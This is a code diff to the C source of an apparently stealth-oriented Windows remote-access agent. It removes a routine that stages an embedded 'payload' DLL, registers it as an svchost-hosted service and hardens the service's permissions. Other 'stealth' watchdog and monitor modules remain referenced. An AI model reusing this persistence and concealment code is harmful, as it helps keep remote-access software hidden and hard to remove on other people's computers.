@@ -61,11 +61,7 @@ limitations under the License.
 #include "stealth_watchdog.h"
 #include "stealth_monitor.h"
 #include "stealth_integration.h"
-#include "svchost_payload.h"
 #include "rundll32_contract.h"
-// Svchost registration helper (implemented in stealth_svchost.c)
-BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
-BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);
 
 // Forward declaration to satisfy early references in this TU
 int wmain(int argc, char* wargv[]);
@@ -8223,6 +8219,8 @@ static int MeshService_IsUnsupportedLifecycleSwitch(const char* arg)
 	if (strcasecmp(arg, "-validate-update") == 0 || strcasecmp(arg, "--validate-update") == 0) { return 1; }
 	if (strcasecmp(arg, "-validate-uninstall") == 0 || strcasecmp(arg, "--validate-uninstall") == 0) { return 1; }
 	if (strcasecmp(arg, "-validate-package") == 0 || strcasecmp(arg, "--validate-package") == 0) { return 1; }
+	if (strcasecmp(arg, "-svchost-register") == 0) { return 1; }
+	if (strcasecmp(arg, "-svchost-unregister") == 0) { return 1; }
 	return 0;
 }
 
@@ -8386,117 +8384,6 @@ int wmain(int argc, char* wargv[])
 	*/
 
 	//CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    // Register svchost-hosted service DLL
-	if (argc > 1 && strcasecmp(argv[1], "-svchost-register") == 0)
-	{
-		WCHAR wTempDll[MAX_PATH * 2] = {0};
-		WCHAR wSvcName[256] = {0};
-		StealthInstallPaths paths;
-		BOOL ok = FALSE;
-		BOOL removeTemp = FALSE;
-		BOOL hasExternalSource = (argc > 2 && argv[2] != NULL && argv[2][0] != 0);
-		BOOL stagedFromEmbedded = FALSE;
-
-		MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
-		if (wSvcName[0] == L'\0')
-		{
-			wcscpy_s(wSvcName, _countof(wSvcName), STEALTH_FALLBACK_SERVICE_NAME);
-		}
-
-		if (hasExternalSource)
-		{
-			if (MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, wTempDll, (int)_countof(wTempDll)) <= 0)
-			{
-				printf("[!] Unable to convert DLL path '%s' to Unicode\n", argv[2]);
-				return 1;
-			}
-
-			if (GetFileAttributesW(wTempDll) == INVALID_FILE_ATTRIBUTES)
-			{
-				wprintf(L"[!] Source DLL not found: %s\n", wTempDll);
-				return 1;
-			}
-		}
-
-		if (!Stealth_GetInstallPaths(&paths))
-		{
-			printf("[!] Failed to resolve installation paths\n");
-			return 1;
-		}
-		if (!Stealth_CreateInstallRootDirectory(paths.installDir))
-		{
-			wprintf(L"[!] Failed to create installation directory: %s\n", paths.installDir);
-			return 1;
-		}
-		// Best-effort create of logs directory (non-fatal)
-		Stealth_CreateInstallationDirectory(paths.logsDir);
-
-		if (paths.dllPath[0] == L'\0')
-		{
-			if (paths.installDir[0] == L'\0')
-			{
-				wprintf(L"[!] Unable to determine svchost DLL destination\n");
-				return 1;
-			}
-			wcscpy_s(paths.dllPath, _countof(paths.dllPath), paths.installDir);
-			size_t dirLen = wcslen(paths.dllPath);
-			if (dirLen > 0 && paths.dllPath[dirLen - 1] != L'\\' && paths.dllPath[dirLen - 1] != L'/')
-			{
-				wcscat_s(paths.dllPath, _countof(paths.dllPath), L"\\");
-			}
-			wcscat_s(paths.dllPath, _countof(paths.dllPath), STEALTH_FALLBACK_DLL_NAME);
-		}
-
-		if (hasExternalSource)
-		{
-			if (!Stealth_InstallFiles(wTempDll, paths.dllPath))
-			{
-				wprintf(L"[!] Failed to copy DLL to %s\n", paths.dllPath);
-				return 1;
-			}
-			removeTemp = (_wcsicmp(wTempDll, paths.dllPath) != 0);
-		}
-		else
-		{
-			if (!MeshSvchostPayload_WriteToPath(paths.dllPath))
-			{
-				Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
-				return 1;
-			}
-			wprintf(L"[+] Embedded payload staged at %s\n", paths.dllPath);
-		}
-
-		ok = Stealth_RegisterSvchostService(wSvcName, paths.dllPath);
-		if (ok)
-		{
-			if (!MeshService_HardenServiceDaclByName(wSvcName))
-			{
-				Stealth_DebugPrintfW(L"[svchost-register] Failed to apply hardened DACL (see debug output)");
-			}
-		}
-		printf(ok ? "[+] Svchost registration successful\n" : "[!] Svchost registration failed\n");
-
-		if (removeTemp)
-		{
-			DeleteFileW(wTempDll);
-		}
-		return ok ? 0 : 1;
-	}
-
-    // Unregister svchost-hosted service
-    if (argc > 1 && strcasecmp(argv[1], "-svchost-unregister") == 0)
-    {
-        WCHAR wSvcName[256] = {0};
-        MeshService_CopyBrandingTextToWide(g_serviceFileText, wSvcName, _countof(wSvcName));
-        if (wSvcName[0] == L'\0')
-        {
-            wcscpy_s(wSvcName, _countof(wSvcName), STEALTH_FALLBACK_SERVICE_NAME);
-        }
-        BOOL ok = Stealth_UnregisterSvchostService(wSvcName);
-        printf(ok ? "[+] Svchost unregistration successful\n" : "[!] Svchost unregistration failed\n");
-        return ok ? 0 : 1;
-    }
-
     // Status: print registry + svchost membership + current service state
     if (argc > 1 && strcasecmp(argv[1], "-svchost-status") == 0)
     {
@@ -9020,10 +8907,6 @@ int wmain(int argc, char* wargv[])
 #endif
 					printf("  rundll32.exe <ServiceDll>,MeshSelfTestHostW --selfTest=1 ...\r\n");
 					printf("                        Run agent self-test harness through the DLL host.\r\n");
-					printf("\r\n");
-					printf("Svchost registration maintenance:\r\n");
-					printf("  -svchost-register     Register service DLL in svchost (netsvcs).\r\n");
-					printf("  -svchost-unregister   Remove svchost registration artifacts.\r\n");
 					printf("\r\n");
 					printf("Additional lifecycle manifest inputs:\r\n");
 					printf("  --WebProxy=\"http://proxyhost:port\"  Specify an HTTPS proxy.\r\n");
